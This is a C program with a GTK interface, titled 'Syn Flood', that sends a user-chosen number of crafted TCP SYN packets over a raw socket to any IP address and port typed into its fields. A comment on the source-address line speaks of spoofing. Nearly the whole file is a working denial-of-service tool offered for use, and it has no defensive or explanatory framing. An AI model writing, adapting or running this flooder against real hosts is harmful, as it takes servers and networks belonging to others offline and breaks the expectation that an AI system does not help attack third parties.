/*
	TCP Syn flood code in C with Linux Sockets :)
*/

#include<stdio.h> //printf
#include<stdbool.h> //boolean
#include<string.h> //memset
#include<stdlib.h> //for exit(0);
#include<sys/socket.h>
#include<errno.h> //For errno - the error number

#include<netdb.h>	//hostend
#include<arpa/inet.h>
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header

#include <gtk/gtk.h>



GtkWidget *mainlabel0;


void * listen_to_receive_ack( void *ptr );
void check_packet(unsigned char* , int);
unsigned short check_sum(unsigned short * , int );
//char * hostname_to_ip(char * );
int get_local_ip (char *);



struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};


struct in_addr dest_ip;



/*
 Checksums - IP and TCP
 */
unsigned short check_sum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}


/*
 Get source IP of system , like 192.168.0.6 or 192.168.1.2
 */

int get_local_ip ( char * buffer)
{
	int sock = socket ( AF_INET, SOCK_DGRAM, 0);

	const char* kGoogleDnsIp = "8.8.8.8";
	int dns_port = 53;

	struct sockaddr_in serv;

	memset( &serv, 0, sizeof(serv) );
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp);
	serv.sin_port = htons( dns_port );

	int err = connect( sock , (const struct sockaddr*) &serv , sizeof(serv) );

	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);
	err = getsockname(sock, (struct sockaddr*) &name, &namelen);

	const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

	close(sock);
}



////////////////////////////////////
//gui
///////////////////////////////////

GtkWidget *entry0;
GtkWidget *entry1;
GtkWidget *entry2;


const gchar *entry0_text;
const gchar *entry1_text;
const gchar *entry2_text;




static void my_function1 (void)
{
  entry0_text = gtk_entry_get_text (GTK_ENTRY (entry0));
  entry1_text = gtk_entry_get_text (GTK_ENTRY (entry1));
  entry2_text = gtk_entry_get_text (GTK_ENTRY (entry2));



  

	int s = socket (AF_INET, SOCK_RAW , IPPROTO_TCP);
	
	
	if(s < 0)
	{
		printf ("Error creating socket. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	else
	{
		printf("Socket created.\n");

	}
	
	//Datagram to represent the packet
	char datagram[4096];	
	
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	
	struct sockaddr_in  dest;
	struct pseudo_header psh;
	
	char *target = entry0_text;
	char *port= entry1_text;

	char *syn_number= entry2_text;

	dest_ip.s_addr = inet_addr( target );
	
	int source_port = 43591;
	char source_ip[20];

	
	get_local_ip( source_ip );
	
	printf("Local source IP is %s \n" , source_ip);
	
	memset (datagram, 0, 4096);	
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons (54321);	//Id of this packet
	iph->frag_off = htons(16384);
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = dest_ip.s_addr;
	
	iph->check = check_sum ((unsigned short *) datagram, iph->tot_len >> 1);
	
	//TCP Header
	tcph->source = htons ( source_port );
	tcph->dest = htons (80);
	tcph->seq = htonl(1105024978);
	tcph->ack_seq = 0;
	tcph->doff = sizeof(struct tcphdr) / 4;		//Size of tcp header
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons ( 14600 );	// maximum allowed window size
	tcph->check = 0; //if you set a checksum to zero, your kernel's IP stack should fill in the correct checksum during transmission
	tcph->urg_ptr = 0;
	
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	
	
	int  iret1;
	
	
	printf("Starting to send syn packets\n");
	
	int p=atoi(port);
	int end=atoi(syn_number);
	
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = dest_ip.s_addr;
	int i=0;
	
	for(i = 0 ; i < end ; i++)
	{
	
	
		tcph->dest = htons ( p );
		tcph->check = 0;	// if you set a checksum to zero, your kernel's IP stack should fill in the correct checksum during transmission
		
		//pseudo_header psh;
		psh.source_address = inet_addr( source_ip );
		psh.dest_address = dest.sin_addr.s_addr;
		tcph->seq = htonl(1105024978+i);
		iph->id = htons (50321+i);
		tcph->source +=i;
		psh.placeholder = 0;
		psh.protocol = IPPROTO_TCP;
		psh.tcp_length = htons( sizeof(struct tcphdr) );
		
		memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
		
		tcph->check = check_sum( (unsigned short*) &psh , sizeof (struct pseudo_header));
		
		//Send the packet
		if ( sendto (s, datagram , sizeof(struct iphdr) + sizeof(struct tcphdr) , 0 , (struct sockaddr *) &dest, sizeof (dest)) < 0)
		{
			printf ("Error sending syn packet. Error number : %d . Error message : %s \n" , errno , strerror(errno));
			exit(0);
		}
	
	}
	


	sleep(1);

	gchar *entry0_text="done !!";
	
//gtk_label_set_text(GTK_LABEL(mainlabel0),entry0_text);	
	
		 gtk_label_set_text(GTK_LABEL(mainlabel0),entry0_text);

	printf("%d" , iret1);
	

	

}

static void
activate (GtkApplication *app,
          gpointer        user_data)
{
  GtkWidget *window;
  GtkWidget *grid;
  GtkWidget *button;
 

  GtkWidget *label;
  GtkWidget *label2;
  GtkWidget *label3;
  
  GtkWidget *label_=gtk_label_new("---------------");
  
  
  mainlabel0=gtk_label_new("");


  window = gtk_application_window_new (app);
  gtk_window_set_title (GTK_WINDOW (window), "Syn Flood");
  gtk_window_set_default_size (GTK_WINDOW (window), 400, 400);
  gtk_container_set_border_width (GTK_CONTAINER (window), 30);

  grid = gtk_grid_new ();
  gtk_container_add (GTK_CONTAINER (window), GTK_WIDGET (grid));

  label = gtk_label_new("IP : ");
  gtk_grid_attach(GTK_GRID(grid), label, 0, 0, 1, 1);
    
  entry0 = gtk_entry_new ();
  gtk_grid_attach (GTK_GRID (grid), entry0, 1, 0, 1, 1);


  label2 = gtk_label_new(" port : ");
  gtk_grid_attach(GTK_GRID(grid), label2, 0, 1, 1, 1);
    
  entry1 = gtk_entry_new ();
  gtk_grid_attach (GTK_GRID (grid), entry1, 1, 1, 1, 1);


  label3 = gtk_label_new("the number of syn: ");
  gtk_grid_attach(GTK_GRID(grid), label3, 0, 2, 1, 1);
    
  entry2 = gtk_entry_new ();
  gtk_grid_attach (GTK_GRID (grid), entry2, 1, 2, 1, 1);


  //label4 = gtk_label_new("scan one port");
  
  button = gtk_button_new_with_label("send packets");
  //button.set_label(label4);
  gtk_grid_attach (GTK_GRID (grid), button, 1, 3, 1, 1);
  g_signal_connect (button, "clicked", G_CALLBACK (my_function1), NULL);



  gtk_grid_attach(GTK_GRID(grid), label_, 1, 5, 1, 1);


  gtk_grid_attach(GTK_GRID(grid), mainlabel0, 1, 6, 1, 1);

  
  
  
  gtk_widget_show_all (window);
}

int
main (int argc, char **argv)
{
  GtkApplication *app;
  int status;

  app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
  g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
  status = g_application_run (G_APPLICATION (app), argc, argv);
  g_object_unref (app);

  return status;
}
